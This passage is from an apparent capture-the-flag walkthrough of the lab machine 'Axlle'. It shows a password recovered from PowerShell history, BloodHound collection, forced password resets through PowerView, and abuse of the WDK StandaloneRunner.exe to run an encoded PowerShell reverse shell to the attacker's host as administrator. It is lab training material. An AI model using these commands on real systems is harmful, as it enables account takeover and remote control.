PS C:\Users\dallon.matrix\desktop> cat user.txt
409d782a************************

```

## Shell as baz.humphries / jacob.greeny

### Enumeration

#### Find Password

dallon.matrix has a PowerShell history file:

```

PS C:\Users\dallon.matrix\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> ls

    Directory: C:\Users\dallon.matrix\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/17/2024   9:41 AM            169 ConsoleHost_history.txt

```

It’s got a plaintext password for dallon.matrix:

```

PS C:\Users\dallon.matrix\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
$SecPassword = ConvertTo-SecureString 'PJsO1du$CVJ#D' -AsPlainText -Force;
$Cred = New-Object
System.Management.Automation.PSCredential('dallon.matrix', $SecPassword);

```

#### Validate

The password does work for dallon.matrix:

```

oxdf@hacky$ netexec smb axlle.htb -u dallon.matrix -p 'PJsO1du$CVJ#D'
SMB         10.10.11.21     445    MAINFRAME        [*] Windows Server 2022 Build 20348 x64 (name:MAINFRAME) (domain:axlle.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.21     445    MAINFRAME        [+] axlle.htb\dallon.matrix:PJsO1du$CVJ#D 

```

It doesn’t work over WinRM, but does over RDP:

```

oxdf@hacky$ netexec winrm axlle.htb -u dallon.matrix -p 'PJsO1du$CVJ#D'
WINRM       10.10.11.21     5985   MAINFRAME        [*] Windows Server 2022 Build 20348 (name:MAINFRAME) (domain:axlle.htb)
WINRM       10.10.11.21     5985   MAINFRAME        [-] axlle.htb\dallon.matrix:PJsO1du$CVJ#D

```

### BloodHound

#### Collection From Linux

With the creds above, I can collect BloodHound data using [Bloodhound-Python](https://github.com/dirkjanm/BloodHound.py):

```

oxdf@hacky$ bloodhound-python -d axlle.htb -c all -u dallon.matrix -p 'PJsO1du$CVJ#D' --zip -ns 10.10.11.21
INFO: Found AD domain: axlle.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: mainframe.axlle.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: mainframe.axlle.htb
INFO: Found 22 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MAINFRAME.axlle.htb
INFO: Done in 00M 16S
INFO: Compressing output into 20240626181942_bloodhound.zip

```

#### Collection From Axlle

I’ll grab the latest `SharpHound.exe` from [their GitHub](https://github.com/BloodHoundAD/SharpHound/releases/tag/v2.4.1) and upload it to Axlle:

```

PS C:\programdata> wget 10.10.14.6/SharpHound.exe -outfile s.exe

```

I’ll run it:

```

PS C:\programdata> .\s.exe all
2024-06-26T15:23:24.9227139-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2024-06-26T15:23:25.0945955-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices
2024-06-26T15:23:25.1258372-07:00|INFORMATION|Initializing SharpHound at 3:23 PM on 6/26/2024
2024-06-26T15:23:25.2977171-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for axlle.htb : MAINFRAME.axlle.htb
2024-06-26T15:23:25.3289676-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices
2024-06-26T15:23:25.5477227-07:00|INFORMATION|Beginning LDAP search for axlle.htb
2024-06-26T15:23:25.5477227-07:00|INFORMATION|Testing ldap connection to axlle.htb
2024-06-26T15:23:25.6102121-07:00|INFORMATION|Beginning LDAP search for axlle.htb Configuration NC
2024-06-26T15:23:56.1883738-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2024-06-26T15:24:13.7039663-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-06-26T15:24:13.7039663-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-06-26T15:24:14.1727153-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2024-06-26T15:24:14.2039705-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2024-06-26T15:24:14.2977118-07:00|INFORMATION|Status: 316 objects finished (+316 6.583333)/s -- Using 45 MB RAM
2024-06-26T15:24:14.2977118-07:00|INFORMATION|Enumeration finished in 00:00:48.7543884
2024-06-26T15:24:14.4070884-07:00|INFORMATION|Saving cache with stats: 256 ID to type mappings.
 256 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-06-26T15:24:14.4383388-07:00|INFORMATION|SharpHound Enumeration Completed at 3:24 PM on 6/26/2024! Happy Graphing!

```

There’s a Zip archive that I’ll exfil over SMB using `smbserver.py` on my host:

```

PS C:\programdata> net use \\10.10.14.6\share /u:oxdf oxdf
The command completed successfully.
PS C:\programdata> copy 20240626152413_BloodHound.zip \\10.10.14.6\share\

```

#### Analysis

dillon.matrix is a member of the Web Devs group, which has `ForceChangePassword` over Jacob.Greeny and Baz.Humphries:

![image-20240626195346773](/img/image-20240626195346773.png)

### Update Password

Both jacob.greeny and baz.humphries are in the Remote Management Users group, which means they can connect to WinRM if I have their password (which I effectively do since I can change it). In theory I could do this from Axlle or from my remote host, but the `IPC$` share is configured such that I wasn’t able to make the remote version work.

I can change a password using either `net` or with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). PowerView is generally considered better. I’ll upload it to Axlle and import it:

```

PS C:\programdata> wget 10.10.14.6/PowerView.ps1 -outfile PowerView.ps1
PS C:\programdata> . .\PowerView.ps1

```

I’ll create a secure password object and set it as baz.humphries’ password:

```

PS C:\programdata> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\programdata> Set-DomainUserPassword -Identity baz.humphries -AccountPassword $SecPassword

```

Now I can connect with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) using that password:

```

oxdf@hacky$ evil-winrm -i axlle.htb -u baz.humphries -p 'Password123!'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\baz.humphries\Documents> 

```

The same method works to get a shell as jacob.greeny.

## Shell as administrator

### Enumeration

Both baz.humphries and jacob.greeny are members of the App Devs group, which allows access to `C:\App Development`:

```
*Evil-WinRM* PS C:\> icacls "App Development"
App Development AXLLE\App Devs:(OI)(CI)(M)
                BUILTIN\Administrators:(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files

```

The `M` means that App Devs have read, write, and delete on files and subfolders in `App Development`. The directory has a single directory, `kbriltr`:

```
*Evil-WinRM* PS C:\App Development\kbfiltr> ls

    Directory: C:\App Development\kbfiltr

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          1/1/2024  10:03 PM                exe
d-----          1/1/2024  10:03 PM                sys
-a----        12/14/2023  11:39 AM           2528 kbfiltr.sln
-a----         6/11/2024  11:16 PM           2805 README.md

```

The `README.md` file gives a description of the project:

```

# Keyboard Translation Program
This is an application in development that uses a WDF kbfiltr as the basis for a translation program. The aim of this application is to allow users to program and simulate custom keyboard layouts for real or fictional languages.

## Features
- Create custom keyboard layouts for real or fictional languages.
- Simulate keyboard inputs using the custom layouts.
- Secret codes to switch between languages and logging output.

## Progress
- kbfiltr driver - Complete
- Keyboard mapping - Complete (hardcoded in driver)
- Custom mapping in application layer - In progress
- Logging - Complete
- Activation of logging - Complete
- Simulation of other keyboard layouts - Incomplete
- Activation of other keyboard layouts - Incomplete
**NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to test and debug this driver in a standalone environment**

## Prerequisites
- Windows 10 or higher
- Visual Studio 2019
- Windows Driver Kit (WDK) 10

## Getting Started
- Clone this repository.
- Open the solution file in Visual Studio.
- Build the solution in Release mode.
- Install the driver by running `.\devcon.exe install .\kbfiltr.inf "*PNP0303"` as Administrator.
- Install the driver as an upperclass filter with `.\devcon.exe /r classfilter keyboard upper -keylogger` as Administrator.
- Install the application by running the install_app.bat file as Administrator.
- Reboot your computer to load the driver.
- Launch the application and start programming your custom keyboard layouts.

## Usage
### Programming a Custom Layout
- Launch the application.
- Click on the Program Layout button.
- Select the language for which you want to program the layout.
- Select the key you want to modify from the list.
- Modify the key's scancode and virtual key code as required.
- Repeat steps 4 and 5 for all the keys you want to modify.
- Save the layout by clicking on the Save Layout button.

### Simulating Inputs
- Launch the application.
- Click on the Simulate Input button.
- Select the language for which you want to simulate the input.
- Type in the input in the normal English layout.
- Trigger language switch as outlined below (when required).
- Verify that the input is translated to the selected language.

### Logging Output
- Launch the application.
- Turn on logging (shortcuts can be created as explained below)
- Use the application as normal.
- The log file will be created in the same directory as the application.

## Triggering/Activation
- To toggle logging output, set up a shortcut in the options menu. INCOMPLETE
- To switch to a different language, press the Left Alt key and the Right Ctrl key simultaneously. INCOMPLETE

## Bugs
There are probably several.

```

### StandAloneRunner.exe

#### Background

The most important thing to take from the above is this paragraph:

> **NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to test and debug this driver in a standalone environment**

`StandaloneRunner.exe` is a binary included with the Windows Driver Kit (WDK) to help with testing / debugging Windows drivers by executing a driver without having to install it.

In searching for “StandAloneRunner.exe”, the first result is [this tweet](https://x.com/nas_bench/status/1739068874476155387):

> Here is a quick write-up for one of the most convoluted LOLBINs to setup.  
>   
> StandaloneRunner.exe is a utility included with the Windows Driver Kit (WDK) used for testing and debugging drivers on Windows systems.  
>   
> It calls to a function named "RunCommand" that directly allows the… [pic.twitter.com/rC1hTnrC48](https://t.co/rC1hTnrC48)
>
> — Nasreddine Bencherchali (@nas\_bench) [December 24, 2023](https://twitter.com/nas_bench/status/1739068874476155387?ref_src=twsrc%5Etfw)

What Nasreddine identified is that in the proper circumstances, it will read the contents of a file named `command.txt` and run it from `cmd.exe`.

#### Exploit POC

To exploit this, I need to create a file structure in the same directory where `StandaloneRunner.exe` will run, which is `C:\program files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64`. Because I expect these to run on a cron and likely with some cleanup, I’ll use one line to create the three needed files:

```
*Evil-WinRM* PS C:\program files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64> $command = "ping 10.10.14.6"
*Evil-WinRM* PS C:\program files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64> $project = "0xdfTest"
*Evil-WinRM* PS C:\program files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64> echo "$command" > command.txt; mkdir -force $project\working > $null; echo "doesn't matter" > $project\working\rsf.rsf; echo "$project`nTrue" > reboot.rsf; tree . /f                                                           
Folder PATH listing
Volume serial number is 000001FD BFF7:F940
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\TESTING\STANDALONETESTING\INTERNAL\X64
¦   command.txt
¦   reboot.rsf
¦   standalonerunner.exe
¦   standalonexml.dll
¦
+---0xdfTest
    +---working
            rsf.rsf

```

The command is just a ping. After a couple minutes, there’s ICMP at my listening `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:42:10.378916 IP 10.10.11.21 > 10.10.14.6: ICMP echo request, id 1, seq 22, length 40
09:42:10.378956 IP 10.10.14.6 > 10.10.11.21: ICMP echo reply, id 1, seq 22, length 40
09:42:11.384440 IP 10.10.11.21 > 10.10.14.6: ICMP echo request, id 1, seq 23, length 40
09:42:11.384457 IP 10.10.14.6 > 10.10.11.21: ICMP echo reply, id 1, seq 23, length 40
09:42:12.400075 IP 10.10.11.21 > 10.10.14.6: ICMP echo request, id 1, seq 24, length 40
09:42:12.400094 IP 10.10.14.6 > 10.10.11.21: ICMP echo reply, id 1, seq 24, length 40
09:42:13.415779 IP 10.10.11.21 > 10.10.14.6: ICMP echo request, id 1, seq 25, length 40
09:42:13.415805 IP 10.10.14.6 > 10.10.11.21: ICMP echo reply, id 1, seq 25, length 40

```

#### Shell

To get a shell, I’ll update the command to a PowerShell reverse shell:

```
*Evil-WinRM* PS C:\program files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64> $command = "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
*Evil-WinRM* PS C:\program files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64> echo "$command" > command.txt; mkdir -force $project\working > $null; echo "doesn't matter" > $project\working\rsf.rsf; echo "$project`nTrue" > reboot.rsf; tree . /f
Folder PATH listing
Volume serial number is 0000025A BFF7:F940
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\TESTING\STANDALONETESTING\INTERNAL\X64
¦   command.txt
¦   reboot.rsf
¦   standalonerunner.exe
¦   standalonexml.dll
¦
+---0xdfTest
    +---working
            rsf.rsf

```

After a couple minutes, I’ll have a shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.21 60691

PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\0xdfTest\working> whoami
axlle\administrator

```

And get `root.txt`:

```

PS C:\Users\Administrator\Desktop> cat root.txt
9cc386c4************************

```